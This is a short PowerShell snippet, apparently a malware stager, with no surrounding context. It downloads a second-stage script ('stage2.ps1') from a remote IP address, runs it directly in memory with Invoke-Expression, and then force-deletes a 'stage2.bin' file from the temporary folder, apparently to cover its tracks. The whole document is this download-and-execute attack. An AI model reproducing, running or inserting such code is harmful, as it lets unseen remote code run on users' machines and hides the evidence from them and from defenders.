$ScriptText = (New-Object System.Net.WebClient).DownloadString("http://198.51.100.250:8080/stage2.ps1")
IEX $ScriptText
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
